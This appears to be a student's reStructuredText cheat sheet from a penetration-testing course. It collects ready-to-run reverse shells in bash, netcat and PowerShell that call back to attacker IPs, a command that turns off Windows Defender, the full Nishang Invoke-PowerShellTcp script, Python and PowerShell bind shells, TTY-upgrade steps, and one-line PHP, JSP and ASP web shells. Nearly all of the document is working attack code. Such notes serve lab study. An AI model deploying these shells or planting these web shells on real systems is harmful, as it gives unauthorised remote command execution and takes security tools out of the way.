shells
#######

Date: 2024-11-17 16:28

Status:

Description
************

Reverse: Shell connects back to our system (like :ref:`netcat <netcat>`)

.. code-block:: console

   nc -lvnp 1234 # Creates a listener on port 1234 (n disables DNS resolv)

Bind shell: Waits for us to connect Web Shell: communicates via a
webserver. Takes commands via the URL

To generate a shell
**********************

Reverse Shell Generator <https://www.revshells.com/

Reverse shells on Linux/Windows
**********************************

Code: bash

.. code-block:: console

   bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

Code: bash

.. code-block:: console

   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f

Code: powershell

example: You may have to disable Windows Defender

.. code-block:: console

   PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true

.. code-block:: console

   powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.40',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"

.. code-block:: console

   powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.40',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

Example: Working - in the shells Windows 10 lab this worked.

.. code-block:: console

   $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

Example: Shell delivered as a payload

.. code-block:: console

   function Invoke-PowerShellTcp 
   { 
   <#
   .SYNOPSIS
   Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
   .DESCRIPTION
   This script is able to connect to a standard Netcat listening on a port when using the -Reverse switch. 
   Also, a standard Netcat can connect to this script Bind to a specific port.
   The script is derived from Powerfun written by Ben Turner & Dave Hardy
   .PARAMETER IPAddress
   The IP address to connect to when using the -Reverse switch.
   .PARAMETER Port
   The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
   .EXAMPLE
   PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
   Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
   the given IP and port. 
   .EXAMPLE
   PS > Invoke-PowerShellTcp -Bind -Port 4444
   Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
   .EXAMPLE
   PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
   Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
   listening on the given IP and port. 
   .LINK
   http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
   https://github.com/nettitude/powershell/blob/master/powerfun.ps1
   https://github.com/samratashok/nishang
   #>      
       [CmdletBinding(DefaultParameterSetName="reverse")] Param(

           [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
           [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
           [String]
           $IPAddress,

           [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
           [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
           [Int]
           $Port,

           [Parameter(ParameterSetName="reverse")]
           [Switch]
           $Reverse,

           [Parameter(ParameterSetName="bind")]
           [Switch]
           $Bind

       )

       
       try 
       {
           #Connect back if the reverse switch is used.
           if ($Reverse)
           {
               $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
           }

           #Bind to the provided port if Bind switch is used.
           if ($Bind)
           {
               $listener = [System.Net.Sockets.TcpListener]$Port
               $listener.start()    
               $client = $listener.AcceptTcpClient()
           } 

           $stream = $client.GetStream()
           [byte[]]$bytes = 0..65535|%{0}

           #Send back current username and computername
           $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
           $stream.Write($sendbytes,0,$sendbytes.Length)

           #Show an interactive PowerShell prompt
           $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
           $stream.Write($sendbytes,0,$sendbytes.Length)

           while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
           {
               $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
               $data = $EncodedText.GetString($bytes,0, $i)
               try
               {
                   #Execute the command on the target.
                   $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
               }
               catch
               {
                   Write-Warning "Something went wrong with execution of command on the target." 
                   Write-Error $_
               }
               $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
               $x = ($error[0] | Out-String)
               $error.clear()
               $sendback2 = $sendback2 + $x

               #Return the results
               $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
               $stream.Write($sendbyte,0,$sendbyte.Length)
               $stream.Flush()  
           }
           $client.Close()
           if ($listener)
           {
               $listener.Stop()
           }
       }
       catch
       {
           Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
           Write-Error $_
       }
   }

.. code-block:: console

   ## Bind Shells on Linux/Windows

   Code: bash

   ```bash
   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f

Code: python

.. code-block:: console

   python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'

Code: powershell

.. code-block:: console

   powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();

Then connect to the shell with :ref:`netcat <netcat>` with:

.. code-block:: console

   nc 10.10.10.10 1234

You will notice there is no terminal prompt, we can fix this with a
little

Types of Shells

.. code-block:: console

   Temen@htb[/htb]$ python -c 'import pty; pty.spawn("/bin/bash")'

After we run this command, we will hit ``ctrl+z`` to background our
shell and get back on our local terminal, and input the following
``stty`` command:

Types of Shells

.. code-block:: console

   www-data@remotehost$ ^Z

   Temen@htb[/htb]$ stty raw -echo
   Temen@htb[/htb]$ fg

   [Enter]
   [Enter]
   www-data@remotehost$

Web shell
*************

Adding to the source code of a web page you can execute service commands
and have it displayed in the browser or through a curl command

Code: php

.. code-block:: console

   <?php system($_REQUEST["cmd"]); ?>

Code: jsp

.. code-block:: console

   <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

Code: asp

.. code-block:: console

   <% eval request("cmd") %>

References
==========
